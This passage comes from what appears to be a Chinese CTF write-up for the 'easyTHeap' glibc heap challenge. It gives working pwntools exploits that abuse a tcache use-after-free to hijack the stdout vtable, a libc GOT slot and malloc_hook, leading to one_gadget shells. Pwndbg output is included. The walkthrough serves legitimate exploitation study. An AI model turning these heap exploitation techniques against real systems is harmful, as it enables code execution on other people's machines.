class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;_IO_str_jumps &#x27;</span> + <span class="built_in">hex</span>(_IO_str_jumps))</span><br><span class="line">	li(<span class="string">&#x27;_IO_2_1_stdout &#x27;</span> + <span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">	vtable_jump = _IO_str_jumps - <span class="number">0x28</span></span><br><span class="line">	gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment"># can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span></span><br><span class="line">	p = p64(_IO_2_1_stdout_) <span class="comment"># evil address</span></span><br><span class="line">	md(<span class="number">3</span>, p)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># idx 5 for ajust</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># idx 6, malloc to our addr</span></span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0xfbad2886</span>)</span><br><span class="line">	p += p64(_IO_2_1_stdout_ + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">	p += p64(_IO_2_1_stdout_ + <span class="number">0x201</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">	p += p32(<span class="number">1</span>) <span class="comment"># file num</span></span><br><span class="line">	p += p32(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">	p += p64(<span class="number">0x000000000a000000</span>)</span><br><span class="line">	_IO_stdfile_1_lock = lib.address + (<span class="number">0x7ff3095508c0</span> - <span class="number">0x7ff309163000</span>)</span><br><span class="line">	p += p64(_IO_stdfile_1_lock)</span><br><span class="line">	p += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	_IO_wide_data_1 = lib.address + (<span class="number">0x7f2fc336a8c0</span> - <span class="number">0x7f2fc2f7f000</span>)</span><br><span class="line">	p += p64(_IO_wide_data_1)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">	p = p.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	p += p64(vtable_jump)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line"></span><br><span class="line">	md(<span class="number">6</span>, p)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105404106">https://blog.csdn.net/seaaseesa/article/details/105404106</a></p>
<h2 id="打法2"><a href="#打法2" class="headerlink" title="打法2"></a>打法2</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 一般</p>
<p>上面那个调用太复杂了,来个直接的</p>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, libc中的链接原理(与plt与got差不多)</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,后面通过还有任意地址分配.将要调用的某个libc中的某个plt函数所对应的跳转地址中的值给改为one_gadget</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>这个获取libc地址的打法与上面一样,就不写了, 主要是获得任意读写地址之后,怎样打one_gadget调用.这个打发就简单得多了,且高效,若所以one_gadget打不通,还可以换其他libc中plt函数来打,打通几率大大提升.</p>
<p>通过调试, 发现在puts中存在一个plt,但是我打了全部one_gadget,就是参数不符合one_gadget,所以在printf中找到一个,如下.ABS*+0xa07f0@plt就是我们的目标了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  0x7f68f522141f &lt;vfprintf+143&gt;    mov    qword ptr [rbp - 0x438], rax</span><br><span class="line">  0x7f68f5221426 &lt;vfprintf+150&gt;    movups xmmword ptr [rbp - 0x448], xmm0</span><br><span class="line">► 0x7f68f522142d &lt;vfprintf+157&gt;    call   *ABS*+0xa07f0@plt &lt;0x7f68f51e7040&gt;</span><br><span class="line">       rdi: 0x55d549dc2ff6 ◂— imul   esp, dword ptr [rax + rdi*2 + 0x3f], 0x6e6f6300 &#x2F;* &#39;idx?&#39; *&#x2F;</span><br><span class="line">       rsi: 0x25</span><br><span class="line">       rdx: 0x7ffe06e5d790 ◂— 0x3000000008</span><br><span class="line">       rcx: 0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反编译<em>ABS</em>+0xa07f0@plt &lt;0x7f68f51e7040&gt;,获取类似与储存地址的got表地址.0x7f68f55b1048</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass 0x7f68f51e7040</span><br><span class="line">Dump of assembler code for function *ABS*+0xa07f0@plt:</span><br><span class="line">   0x00007f68f51e7040 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x3ca002]        # 0x7f68f55b1048</span><br><span class="line">   0x00007f68f51e7046 &lt;+6&gt;:	push   0x28</span><br><span class="line">   0x00007f68f51e704b &lt;+11&gt;:	jmp    0x7f68f51e6fd0</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x &#x2F;40gx 0x7f68f55b1048 # 修改里面的地址为one_gadget就行.</span><br><span class="line">0x7f68f55b1048:	0x00007f68f5277120	0x00007f68f5345c80</span><br><span class="line">0x7f68f55b1058:	0x00007f68f51e7066	0x00007f68f5347490</span><br><span class="line">0x7f68f55b1088:	0x00007f68f5271970	0x00007f68f5350f90</span><br><span class="line">0x7f68f55b1098:	0x00007f68f5271ea0	0x00007f68f55d0250</span><br><span class="line">...  ...</span><br><span class="line">pwndbg&gt; x &#x2F;10gx 0x00007f68f5277120</span><br><span class="line">0x7f68f5277120 &lt;__strchrnul_sse2&gt;:	0xff25f889ce6e0f66	0x3dc9600f6600000f</span><br><span class="line">0x7f68f5277130 &lt;__strchrnul_sse2+16&gt;:	0xc9610f6600000fc0	0x4d8f0f00c9700f66</span><br><span class="line">0x7f68f5277140 &lt;__strchrnul_sse2+32&gt;:	0x66076f0ff3000001	0x66e06f0f66dbef0f</span><br><span class="line">0x7f68f5277150 &lt;__strchrnul_sse2+48&gt;:	0x66e3740f66c1740f	0x85c0d70f66c4eb0f</span><br><span class="line">0x7f68f5277160 &lt;__strchrnul_sse2+64&gt;:	0x8d48c0bc0f0d74c0	0x0000441f0fc30704</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp-2"></a>exp-2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;vn_pwn_easyTHeap&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">28200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 0</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 1</span></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak heap addr</span></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	heap_base = u64(ru(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x260</span></span><br><span class="line">	li(<span class="string">&#x27;heap_base &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 2 for ajust</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 3</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 4 teache count as -1, so free chunk will not be teache bin</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">	li(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">	ABS = lib.address + (<span class="number">0x7fd855098048</span> - <span class="number">0x7fd854cad000</span>)</span><br><span class="line">	gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xef863</span>, <span class="number">0x10a38c</span>, <span class="number">0x10a398</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment"># can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">3</span>, p64(ABS))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># idx 5 for ajust</span></span><br><span class="line">	li(<span class="string">&#x27;ABS_got &#x27;</span> + <span class="built_in">hex</span>(ABS))</span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># idx 6, malloc to our addr</span></span><br><span class="line"></span><br><span class="line">	p = p64(one_gadget)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	md(<span class="number">6</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r14] == NULL || r14 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="打法3"><a href="#打法3" class="headerlink" title="打法3"></a>打法3</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 高</p>
<p>上面那个两个都没有控制好malloc的次数,多了一个,这个就控制少了一个,所以直接修改realloc_hook和malloc_hook打one_gadget.</p>
<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>tcache管理机制</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了malloc 和 free 的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址,且也使该方法打入tcache 管理头部,也就是堆的头部,修改tcahe的数量为7,在释放堆块的时候就不会由tcache bin来管理.这样可以泄漏libc,再次修改该结构,使bin指向malloc - 8处,下次分配直接修改该地址,realloc调参数打one_gadget</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp-3"></a>exp-3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = 